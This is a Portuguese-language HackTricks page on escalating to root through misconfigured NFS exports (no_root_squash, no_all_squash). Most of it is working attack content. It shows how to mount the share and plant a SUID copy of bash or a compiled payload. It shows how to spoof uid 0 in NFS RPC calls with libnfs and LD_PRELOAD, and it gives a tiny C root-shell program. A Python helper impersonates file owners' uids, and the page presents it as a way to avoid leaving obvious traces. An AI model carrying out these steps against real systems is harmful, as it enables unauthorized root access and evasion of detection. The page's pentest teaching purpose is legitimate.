<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


Leia o arquivo _ **/etc/exports** _, se você encontrar algum diretório configurado como **no\_root\_squash**, então você pode **acessá-lo** **como um cliente** e **escrever dentro** desse diretório **como** se fosse o **root** local da máquina.

**no\_root\_squash**: Essa opção basicamente dá autoridade ao usuário root no cliente para acessar arquivos no servidor NFS como root. E isso pode levar a sérias implicações de segurança.

**no\_all\_squash:** Essa opção é semelhante à **no\_root\_squash**, mas se aplica a **usuários não-root**. Imagine que você tenha um shell como usuário nobody; verificou o arquivo /etc/exports; a opção no\_all\_squash está presente; verifique o arquivo /etc/passwd; emule um usuário não-root; crie um arquivo suid como esse usuário (montando usando nfs). Execute o suid como usuário nobody e torne-se um usuário diferente.

# Escalonamento de Privilégios

## Exploração Remota

Se você encontrou essa vulnerabilidade, você pode explorá-la:

* **Montando esse diretório** em uma máquina cliente e, **como root, copiando** para dentro da pasta montada o binário **/bin/bash** e concedendo a ele direitos **SUID**, e **executando a partir da máquina vítima** esse binário bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montando esse diretório** em uma máquina cliente e, **como root, copiando** dentro da pasta montada nosso payload compilado que abusará da permissão SUID, dar a ele direitos **SUID** e **executar a partir da máquina vítima** esse binário (você pode encontrar aqui alguns [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploit Local

{% hint style="info" %}
Note que se você puder criar um **túnel da sua máquina para a máquina vítima, você ainda pode usar a versão Remota para explorar essa escalada de privilégios tunelando as portas necessárias**.\
A dica a seguir é para o caso do arquivo `/etc/exports` **indicar um endereço IP**. Neste caso, você **não poderá usar** de forma alguma o **exploit remoto** e precisará **abusar desta dica**.\
Outro requisito necessário para o funcionamento do exploit é que **a exportação dentro de `/etc/export`** **deve estar usando a flag `insecure`**.\
\--_Não tenho certeza de que se `/etc/export` estiver indicando um endereço IP, esta dica funcionará_--
{% endhint %}

**Dica copiada de** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

Agora, vamos supor que o servidor de compartilhamento ainda execute `no_root_squash`, mas há algo que nos impede de montar o compartilhamento em nossa máquina de pentesting. Isso aconteceria se o `/etc/exports` tivesse uma lista explícita de endereços IP permitidos para montar o compartilhamento.

Listar os compartilhamentos agora mostra que apenas a máquina que estamos tentando privesc é permitida para montá-lo:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
Isso significa que estamos presos explorando o compartilhamento montado na máquina localmente a partir de um usuário não privilegiado. Mas acontece que existe outro exploit local menos conhecido.

Esse exploit depende de um problema na especificação do NFSv3 que determina que é responsabilidade do cliente anunciar seu uid/gid ao acessar o compartilhamento. Assim, é possível falsificar o uid/gid forjando as chamadas RPC do NFS se o compartilhamento já estiver montado!

Aqui está uma [biblioteca que permite fazer exatamente isso](https://github.com/sahlberg/libnfs).

### Compilando o exemplo <a href="#compilando-o-exemplo" id="compilando-o-exemplo"></a>

Dependendo do seu kernel, você pode precisar adaptar o exemplo. No meu caso, tive que comentar as chamadas de sistema fallocate.
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Explorando usando a biblioteca <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

Vamos usar o exploit mais simples:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
Coloque nosso exploit no compartilhamento e torne-o suid root ao falsificar nosso uid nas chamadas RPC:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
Tudo o que resta é iniciá-lo:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
Lá estamos nós, escalonamento de privilégios para root local!

## Bônus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

Uma vez com privilégios de root local na máquina, eu queria vasculhar o compartilhamento NFS em busca de possíveis segredos que me permitissem pivotar. Mas havia muitos usuários do compartilhamento, todos com seus próprios uids, que eu não conseguia ler apesar de ser root, devido à incompatibilidade de uids. Eu não queria deixar rastros óbvios como um chown -R, então criei um pequeno trecho de código para definir meu uid antes de executar o comando de shell desejado:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Então você pode executar a maioria dos comandos como normalmente faria, prefixando-os com o script:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>
